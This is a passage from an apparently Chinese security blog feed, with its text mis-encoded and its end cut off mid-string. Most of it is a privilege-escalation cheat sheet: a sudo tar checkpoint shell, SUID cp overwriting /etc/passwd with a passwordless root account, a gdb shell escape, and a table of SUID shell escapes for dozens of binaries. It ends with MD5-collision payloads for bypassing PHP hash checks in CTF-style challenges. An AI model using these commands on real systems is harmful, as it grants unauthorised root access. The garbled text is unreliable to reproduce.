class="code"><pre><code class="hljs plain">sudo -u root tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=exec=&quot;/bin/bash&quot;<br></code></pre></td></tr></table></figure><ul><li><code>-c</code>ï¼šåˆ›å»ºæ–°çš„æ¡£æ¡ˆæ–‡ä»¶ï¼Œç›¸å½“äºæ‰“åŒ…ï¼ˆ-xï¼Œç›¸åçš„æ“ä½œï¼Œæ‹†åŒ…ï¼‰</li><li><code>-f</code>ï¼šä½¿ç”¨æ¡£åï¼Œfä¹‹åç›´æ¥åŠ æ¡£åï¼Œä¸­é—´ä¸èƒ½åŠ å…¶ä»–å‚æ•°</li><li><code>--checkpoint=n</code>ï¼šæ¯å†™å…¥nä¸ªè®°å½•ä¹‹åè®¾ç½®ä¸€ä¸ªæ£€æŸ¥ç‚¹ï¼Œåœ¨æ£€æŸ¥ç‚¹å¯ä»¥æ‰§è¡Œä»»æ„çš„æ“ä½œï¼Œæ“ä½œç”± â€“checkpoint-action æŒ‡å®š</li><li><code>exec</code>ï¼šæ‰§è¡Œå¤–éƒ¨å‘½ä»¤</li></ul><p>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤åå°±ææƒæˆåŠŸäº†ï¼Œç”¨<code>id</code>å‘½ä»¤æŸ¥çœ‹å½“å‰ç”¨æˆ·å‘ç°å·²ç»æ˜¯rootï¼Œæ­¤æ—¶å¯ä»¥è‡ªç”±æŸ¥çœ‹ &#x2F;root æ–‡ä»¶ä¸­çš„å†…å®¹</p><h3 id="suid-cpææƒ"><a href="#suid-cpææƒ" class="headerlink" title="suid cpææƒ"></a><strong>suid cpææƒ</strong></h3><p>ç”¨å‘½ä»¤æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨suidææƒçš„å¯èƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">find / -perm -u=s -type f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°<code>/bin/cp</code>å°±çŸ¥é“å¯ä»¥ç”¨ cp ææƒäº†<br>æ“ä½œæ­¥éª¤ï¼šå…ˆæ„é€ ä¸€ä¸ªå’Œ&#x2F;etc&#x2F;passwdé‡Œä¸€æ ·çš„æ–‡ä»¶ ç„¶ååœ¨æ–‡ä»¶çš„æœ«å°¾åŠ ä¸Šä¸€ä¸ªç”¨æˆ· è¿™ä¸ªç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯éƒ½å¯ä»¥éšä½ ç¼–å†™ å†åˆ©ç”¨cpçš„é«˜æƒé™å¯¹&#x2F;etc&#x2F;passwdæ–‡ä»¶è¿›è¡Œè¦†ç›– </p><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a><strong>æ–¹æ³•ä¸€</strong></h4><p>åœ¨&#x2F;tmpæ–°å»ºä¸€ä¸ªpasswdæ–‡ä»¶ï¼Œåœ¨tmpçš„åŸå› æ˜¯å› ä¸ºtmpç›®å½•æ˜¯ä¸´æ—¶ç¼“å­˜ç›®å½• ä¸€èˆ¬è®¿é—®å’Œä¿®æ”¹æƒé™è¾ƒä½ä½†å¯æ‰§è¡Œæƒé™è¾ƒé«˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">echo &quot;hacker::0:0:hacker:/home/hacker:/bin/bash&quot; &gt;&gt;/tmp/passwd<br></code></pre></td></tr></table></figure><p>ç„¶åå›åˆ°å‘½ä»¤è¡Œä½¿ç”¨ cp å‘½ä»¤æŠŠ &#x2F;etc&#x2F;passwd ç”¨ &#x2F;tmp&#x2F;passwd æ›¿æ¢æ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /tmp/passwd /etc/passwd<br></code></pre></td></tr></table></figure><p>ç„¶å<code>cat /etc/passwd</code>æŸ¥çœ‹ &#x2F;etc&#x2F;passwd å¯ä»¥çœ‹åˆ°æœ‰äº†hackerç”¨æˆ·</p><p>ä½¿ç”¨<code>su hacker</code>å‘½ä»¤åˆ‡æ¢æˆhackerç”¨æˆ·</p><p>æ­¤æ—¶æˆ‘ä»¬æ‹¥æœ‰rootæƒé™ï¼Œå°±å¯ä»¥æŸ¥çœ‹rootæ–‡ä»¶é‡Œçš„å†…å®¹äº†</p><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a><strong>æ–¹æ³•äºŒ</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /bin/bash /tmp<br>/bin/cp --attributes-only --preserve=all /bin/cp /tmp/bash<br>/tmp/bash -p<br></code></pre></td></tr></table></figure><p>ä¾æ¬¡æ‰§è¡Œå®Œè¿™ä¸‰ä¸ªå‘½ä»¤</p><p>ç”¨<code>id</code>å‘½ä»¤å¯ä»¥çœ‹åˆ°euidå·²ç»æ˜¯rootäº†ï¼Œç”¨<code>whoami</code>å¯ä»¥çœ‹åˆ°æ˜¯root</p><p>æ­¤æ—¶å°±å¯ä»¥æŸ¥çœ‹rootæ–‡ä»¶é‡Œçš„å†…å®¹</p><h3 id="suid-gdbææƒ"><a href="#suid-gdbææƒ" class="headerlink" title="suid gdbææƒ"></a>suid gdbææƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit<br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨ææƒå‘½ä»¤"><a href="#å¸¸ç”¨ææƒå‘½ä»¤" class="headerlink" title="å¸¸ç”¨ææƒå‘½ä»¤"></a>å¸¸ç”¨ææƒå‘½ä»¤</h3><table><thead><tr><th><strong><font style="color:rgb(0, 161, 251);">å‘½ä»¤</font></strong></th><th><strong><font style="color:rgb(0, 161, 251);">åˆ©ç”¨æ–¹æ³•</font></strong></th></tr></thead><tbody><tr><td>zsh</td><td>zsh</td></tr><tr><td><strong>xargs</strong></td><td>xargs -a &#x2F;dev&#x2F;null sh -p</td></tr><tr><td><strong>watch</strong></td><td>watch -x sh -c â€˜reset; exec sh -p 1&gt;&amp;0 2&gt;&amp;0â€™</td></tr><tr><td><strong>timeout</strong></td><td>timeout 7d &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>time</strong></td><td>time &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>tclsh</strong></td><td>+ tclsh <br/>+ exec &#x2F;bin&#x2F;sh -p &lt;@stdin &gt;@stdout 2&gt;@stderr</td></tr><tr><td><strong>taskset</strong></td><td>taskset 1 &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>stdbuf</strong></td><td>stdbuf -i0 &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>strace</strong></td><td>strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ssh</strong></td><td>ssh -o ProxyCommand&#x3D;â€™;sh -p 0&lt;&amp;2 1&gt;&amp;2â€™ x</td></tr><tr><td><strong>setarch</strong></td><td>setarch $(arch) &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>rsync</strong></td><td>rsync -e â€˜sh -p -c â€œsh -p 0&lt;&amp;2 1&gt;&amp;2â€â€™ 127.0.0.1:&#x2F;dev&#x2F;null</td></tr><tr><td><strong>rpm</strong></td><td>rpm â€“eval â€˜%{lua:os.execute(â€œ&#x2F;bin&#x2F;sh -pâ€)}â€™</td></tr><tr><td><strong>python</strong></td><td>python -c â€˜import os; os.execl(â€œ&#x2F;bin&#x2F;shâ€, â€œshâ€, â€œ-pâ€)â€™</td></tr><tr><td><strong>php</strong></td><td>+  CMD&#x3D;â€&#x2F;bin&#x2F;shâ€  <br/>+  php -r â€œpcntl_exec(â€™&#x2F;bin&#x2F;shâ€™, [â€™-pâ€™]);â€</td></tr><tr><td><strong>nice</strong></td><td>nice &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>nano</strong></td><td>+  nano &#x2F;&#x2F;è¿è¡Œnanoç¨‹åº  <br/>+  ^R &#x2F;&#x2F;æŒ‰ä¸‹ctrl-r  <br/>+  ^X &#x2F;&#x2F;æŒ‰ä¸‹ctrl-x 4ã€reset; sh -p 1&gt;&amp;0 2&gt;&amp;0 &#x2F;&#x2F;è¾“å…¥ä¸‹é¢çš„å‘½ä»¤</td></tr><tr><td><strong>more</strong></td><td>+  more &#x2F;etc&#x2F;profile<br/>+  !&#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>logsave</strong></td><td>logsave &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh -i -p</td></tr><tr><td><strong>less</strong></td><td>less &#x2F;etc&#x2F;profile &#x2F;&#x2F;è¯»å–æ–‡ä»¶ï¼Œåœ¨åº•è¡Œè¾“å…¥!&#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ksh</strong></td><td>ksh -p</td></tr><tr><td><strong>ip</strong></td><td>+  ip netns add foo  <br/>+  ip netns exec foo &#x2F;bin&#x2F;sh -p  <br/>+  ip netns delete foo</td></tr><tr><td><strong>ionice</strong></td><td>ionice &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>git</strong></td><td>git help status</td></tr><tr><td><strong>gimp</strong></td><td>gimp -idf â€“batch-interpreter&#x3D;python-fu-eval -b â€˜import os; os.execl(â€œ&#x2F;bin&#x2F;shâ€, â€œshâ€, â€œ-pâ€)â€™</td></tr><tr><td><strong>gdb</strong></td><td>gdb -nx -ex â€˜python import os; os.execl(â€œ&#x2F;bin&#x2F;shâ€, â€œshâ€, â€œ-pâ€)â€™ -ex quit</td></tr><tr><td><strong>ftp</strong></td><td>ftp &#x2F;&#x2F;åœ¨åº•è¡Œè¾“å…¥â€œ!&#x2F;bin&#x2F;sh -pâ€</td></tr><tr><td><strong>flock</strong></td><td>flock -u &#x2F; &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>find</strong></td><td>find . -exec &#x2F;bin&#x2F;sh -p ; -quit</td></tr><tr><td><strong>expect</strong></td><td>expect -c â€˜spawn &#x2F;bin&#x2F;sh -p;interactâ€™</td></tr><tr><td><strong>env</strong></td><td>env &#x2F;bin&#x2F;sh -p</td></tr><tr><td><strong>ed</strong></td><td>ed &#x2F;&#x2F;åœ¨åº•è¡Œè¾“å…¥â€œ!&#x2F;bin&#x2F;sh -pâ€</td></tr><tr><td><strong>docker</strong></td><td>docker run -v &#x2F;:&#x2F;mnt â€“rm -it alpine chroot &#x2F;mnt sh</td></tr><tr><td><strong>dmesg</strong></td><td>dmesg -H&#x2F;&#x2F;åœ¨åº•è¡Œè¾“å…¥â€œ!&#x2F;bin&#x2F;sh -pâ€</td></tr><tr><td><strong>csh</strong></td><td>csh -b</td></tr><tr><td><strong>bash</strong></td><td>bash -p</td></tr><tr><td><strong>awk</strong></td><td>awk â€˜BEGIN {system(â€œ&#x2F;bin&#x2F;bash -pâ€)}â€™</td></tr><tr><td><strong>perl</strong></td><td>perl exec â€œ&#x2F;bin&#x2F;bashâ€;</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MD5ç»•è¿‡</title>
    <link href="/2025/04/25/MD5%E7%BB%95%E8%BF%87/"/>
    <url>/2025/04/25/MD5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">å¯¹äºï¼š(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_1&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_1&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5_2&#x27;</span>])<br>â— md5_1=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>â— md5_2=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><h3 id="MD5å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²"><a href="#MD5å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²" class="headerlink" title="MD5å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²"></a>MD5å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">â—  %<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span 